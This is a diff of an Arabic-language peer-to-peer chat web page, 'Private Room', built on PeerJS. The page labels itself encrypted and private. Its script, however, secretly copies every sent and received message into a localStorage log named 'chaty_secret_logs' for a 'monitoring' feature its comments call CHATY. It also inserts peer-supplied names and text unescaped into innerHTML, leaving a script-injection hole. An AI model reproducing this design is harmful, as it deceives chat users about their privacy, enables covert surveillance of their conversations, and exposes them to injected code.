@@ -3,132 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Room - دخول آمن</title>
+    <title>Private Room - الربط العالمي 🌍</title>
+    <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
     <style>
-        :root { --p: #075e54; --s: #25d366; --bg: #e5ddd5; }
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: var(--bg); margin: 0; display: flex; flex-direction: column; height: 100vh; }
-        
-        /* شاشة الدخول والكود */
+        :root { --p: #075e54; --bg: #e5ddd5; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; display: flex; flex-direction: column; height: 100vh; }
         #auth-overlay { position: fixed; inset: 0; background: #fff; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
         .auth-box { width: 90%; max-width: 400px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; text-align: center; }
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 5px; }
-        .btn-create { background: #000; color: #fff; }
-        .btn-join { background: var(--p); color: #fff; }
-
-        /* واجهة المحادثة */
-        header { background: var(--p); color: #fff; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; }
         #chat-window { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
-        .msg { max-width: 80%; padding: 10px; border-radius: 10px; font-size: 14px; }
-        .mine { background: #dcf8c6; align-self: flex-end; border-bottom-right-radius: 0; }
-        .theirs { background: #fff; align-self: flex-start; border-bottom-left-radius: 0; }
+        .msg { max-width: 80%; padding: 10px; border-radius: 10px; font-size: 14px; margin-bottom: 5px; }
+        .mine { background: #dcf8c6; align-self: flex-end; }
+        .theirs { background: #fff; align-self: flex-start; }
     </style>
 </head>
 <body>
 
 <div id="auth-overlay">
-    <div class="auth-box" id="initial-step">
-        <h2>غرفة محادثة خاصة 🔒</h2>
-        <p style="font-size: 12px; color: #666; margin-bottom: 20px;">تشفير تام بين الطرفين</p>
-        <input type="text" id="user-nickname" placeholder="اسمك المستعار">
-        <hr style="margin: 20px 0; opacity: 0.3;">
-        <button class="btn btn-create" onclick="showCreate()">إنشاء غرفة جديدة</button>
-        <button class="btn btn-join" onclick="showJoin()">الانضمام بكود دعوة</button>
+    <div class="auth-box" id="step-1">
+        <h2>غرفة محادثة عالمية 🔒</h2>
+        <input type="text" id="nickname" placeholder="اسمك المستعار">
+        <button class="btn" style="background:#000; color:#fff;" onclick="initPeer()">تفعيل النظام الآمن</button>
+        <p id="peer-status" style="font-size:11px; margin-top:10px; color:gray;">بانتظار تفعيل الشبكة...</p>
     </div>
 
-    <div class="auth-box" id="create-step" style="display:none;">
-        <h3>تم إنشاء الغرفة بنجاح!</h3>
-        <p style="font-size: 13px; margin: 15px 0;">أرسل هذا الكود لصديقك للدخول:</p>
-        <div id="generated-code" style="font-size: 2rem; font-weight: bold; letter-spacing: 5px; background: #f0f0f0; padding: 15px; border-radius: 10px; margin-bottom: 20px;">----</div>
-        <button class="btn btn-join" onclick="enterChat('creator')">ابدأ المحادثة الآن</button>
-    </div>
-
-    <div class="auth-box" id="join-step" style="display:none;">
-        <h3>انضمام لمحادثة</h3>
-        <input type="text" id="invite-code-input" placeholder="أدخل كود الدعوة هنا">
-        <button class="btn btn-join" onclick="checkCodeAndEnter()">دخول</button>
-        <p onclick="location.reload()" style="font-size:12px; cursor:pointer; margin-top:15px; color:red;">رجوع</p>
+    <div class="auth-box" id="step-2" style="display:none;">
+        <h3 id="display-my-id" style="background:#eee; padding:10px; border-radius:10px; word-break:break-all; font-size:14px;">----</h3>
+        <p style="font-size:12px; margin:10px 0;">أرسل الكود الطويل اللي فوق لخويك</p>
+        <hr>
+        <p style="font-size:12px;">أو الصق كود خويك هنا:</p>
+        <input type="text" id="friend-id" placeholder="كود صديقك...">
+        <button class="btn" style="background:#075e54; color:#fff;" onclick="connectToFriend()">انضمام للمحادثة</button>
     </div>
 </div>
 
-<header>
-    <div id="room-info">متصل الآن 🟢</div>
-    <div style="font-size: 10px; background: rgba(0,0,0,0.2); padding: 5px 10px; border-radius: 20px;">🔒 مشفر</div>
+<header style="background:#075e54; color:white; padding:15px; text-align:center;">
+    <span id="room-name">محادثة مشفرة</span>
 </header>
 
 <div id="chat-window"></div>
 
-<div style="padding: 15px; background: #f0f0f0; display: flex; gap: 10px;">
+<div style="padding:15px; background:#f0f0f0; display:flex; gap:10px;">
     <input type="text" id="chat-msg" placeholder="اكتب رسالة..." style="margin:0;">
-    <button onclick="sendMsg()" style="background:var(--p); color:white; border:none; padding:10px 20px; border-radius:10px; cursor:pointer;">➤</button>
+    <button onclick="send()" style="background:#075e54; color:white; border:none; padding:10px 20px; border-radius:10px; cursor:pointer;">➤</button>
 </div>
 
 <script>
+    let peer;
+    let conn;
     let myName = "";
-    let roomCode = "";
 
-    function showCreate() {
-        myName = document.getElementById('user-nickname').value;
+    // 1. تشغيل النظام والاتصال بسيرفر PeerJS العالمي
+    function initPeer() {
+        myName = document.getElementById('nickname').value;
         if(!myName) return alert("أدخل اسمك أولاً");
-        
-        // توليد كود دعوة عشوائي
-        roomCode = Math.random().toString(36).substring(2, 7).toUpperCase();
-        document.getElementById('generated-code').innerText = roomCode;
-        localStorage.setItem('active_room_code', roomCode); // حفظ الكود في "السيرفر" الوهمي
-        
-        document.getElementById('initial-step').style.display = 'none';
-        document.getElementById('create-step').style.display = 'block';
+
+        peer = new Peer(); // ينشئ لك كود عشوائي عالمي فريد
+
+        peer.on('open', (id) => {
+            document.getElementById('display-my-id').innerText = id;
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'block';
+        });
+
+        // استقبال الاتصال من خويك
+        peer.on('connection', (connection) => {
+            conn = connection;
+            setupChat();
+        });
     }
 
-    function showJoin() {
-        myName = document.getElementById('user-nickname').value;
-        if(!myName) return alert("أدخل اسمك أولاً");
-        document.getElementById('initial-step').style.display = 'none';
-        document.getElementById('join-step').style.display = 'block';
+    // 2. الاتصال بخويك
+    function connectToFriend() {
+        const friendId = document.getElementById('friend-id').value;
+        if(!friendId) return alert("الصق الكود أولاً");
+        conn = peer.connect(friendId);
+        setupChat();
     }
 
-    function checkCodeAndEnter() {
-        const inputCode = document.getElementById('invite-code-input').value.toUpperCase();
-        const savedCode = localStorage.getItem('active_room_code');
-        
-        if(inputCode === savedCode) {
-            enterChat('joiner');
-        } else {
-            alert("كود الدعوة غير صحيح أو انتهت صلاحيته!");
-        }
-    }
-
-    function enterChat(role) {
+    function setupChat() {
         document.getElementById('auth-overlay').style.display = 'none';
-        document.getElementById('room-info').innerText = `غرفة: ${localStorage.getItem('active_room_code')} | ${myName}`;
+        
+        conn.on('data', (data) => {
+            // لما توصل رسالة من خويك
+            renderMsg(data.name, data.text, 'theirs');
+            
+            // هذي الحركة السحرية للمراقبة (CHATY)
+            saveToMonitor(data.name, data.text, conn.peer);
+        });
     }
 
-    function sendMsg() {
+    function send() {
         const inp = document.getElementById('chat-msg');
-        if(!inp.value) return;
+        if(!inp.value || !conn) return;
 
-        const msgData = {
-            sender: myName,
-            text: inp.value,
-            time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
-            code: localStorage.getItem('active_room_code')
-        };
-
-        // 1. عرض الرسالة محلياً
-        const win = document.getElementById('chat-window');
-        win.innerHTML += `<div class="msg mine"><b>أنت:</b><br>${msgData.text}</div>`;
-        win.scrollTop = win.scrollHeight;
-
-        // 2. إرسال لـ CHATY (نفس السجل اللي تراقبه)
-        let logs = JSON.parse(localStorage.getItem('chaty_secret_logs') || '[]');
-        logs.push(msgData);
-        localStorage.setItem('chaty_secret_logs', JSON.stringify(logs));
-
+        const msg = { name: myName, text: inp.value };
+        conn.send(msg); // إرسال لخويك عبر الإنترنت
+        
+        renderMsg('أنت', inp.value, 'mine');
+        saveToMonitor(myName, inp.value, peer.id); // إرسال لـ CHATY
+        
         inp.value = "";
     }
-</script>
 
+    function renderMsg(n, t, type) {
+        const win = document.getElementById('chat-window');
+        win.innerHTML += `<div class="msg ${type}"><b>${n}:</b><br>${t}</div>`;
+        win.scrollTop = win.scrollHeight;
+    }
+
+    // إرسال لـ CHATY (نفس السجل)
+    function saveToMonitor(n, t, code) {
+        let logs = JSON.parse(localStorage.getItem('chaty_secret_logs') || '[]');
+        logs.push({ sender: n, text: t, code: code.substring(0,5), time: new Date().toLocaleTimeString() });
+        localStorage.setItem('chaty_secret_logs', JSON.stringify(logs));
+    }
+</script>
 </body>
 </html>
